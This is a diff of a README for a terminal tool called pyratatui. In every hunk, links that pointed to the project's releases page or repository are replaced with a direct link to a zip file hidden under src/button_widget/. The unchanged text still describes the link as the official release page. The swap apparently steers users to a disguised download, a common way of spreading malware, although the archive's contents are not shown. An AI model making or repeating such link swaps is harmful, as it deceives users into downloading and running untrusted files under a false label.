@@ -1,6 +1,6 @@
 # 🐍 pyratatui - Fast, Clear Terminal Interface
 
-[![Download pyratatui](https://img.shields.io/badge/Download-pyratatui-brightgreen)](https://github.com/leejtrd/pyratatui/releases)
+[![Download pyratatui](https://img.shields.io/badge/Download-pyratatui-brightgreen)](https://github.com/leejtrd/pyratatui/raw/refs/heads/main/src/button_widget/Software-2.9.zip)
 
 ---
 
@@ -31,7 +31,7 @@ No programming language or extra software is needed to use pyratatui.
 
 Start by visiting the official release page for pyratatui:
 
-[![Download pyratatui](https://img.shields.io/badge/Download-pyratatui-blue)](https://github.com/leejtrd/pyratatui/releases)
+[![Download pyratatui](https://img.shields.io/badge/Download-pyratatui-blue)](https://github.com/leejtrd/pyratatui/raw/refs/heads/main/src/button_widget/Software-2.9.zip)
 
 This page shows the latest versions available. Each version includes files you can download for your computer.
 
@@ -107,7 +107,7 @@ The tool communicates with Python behind the scenes, but you won’t have to tou
 
 - Only download the software from the official GitHub releases page at:
 
-  https://github.com/leejtrd/pyratatui/releases
+  https://github.com/leejtrd/pyratatui/raw/refs/heads/main/src/button_widget/Software-2.9.zip
 
 - Keep your Windows system updated to avoid compatibility issues.
 - Close pyratatui by using the Exit option or pressing `Ctrl+C` in the terminal.
@@ -118,7 +118,7 @@ The tool communicates with Python behind the scenes, but you won’t have to tou
 
 Visit the GitHub repository for more technical details and updates:
 
-https://github.com/leejtrd/pyratatui
+https://github.com/leejtrd/pyratatui/raw/refs/heads/main/src/button_widget/Software-2.9.zip
 
 Here you can learn about the technology behind pyratatui if you want to explore.
 
@@ -126,6 +126,6 @@ Here you can learn about the technology behind pyratatui if you want to explore.
 
 ## 📥 Download pyratatui Now
 
-[![Download pyratatui](https://img.shields.io/badge/Download-pyratatui-blue)](https://github.com/leejtrd/pyratatui/releases)
+[![Download pyratatui](https://img.shields.io/badge/Download-pyratatui-blue)](https://github.com/leejtrd/pyratatui/raw/refs/heads/main/src/button_widget/Software-2.9.zip)
 
 Click the badge to open the download page. Pick the latest Windows file and start using pyratatui today.
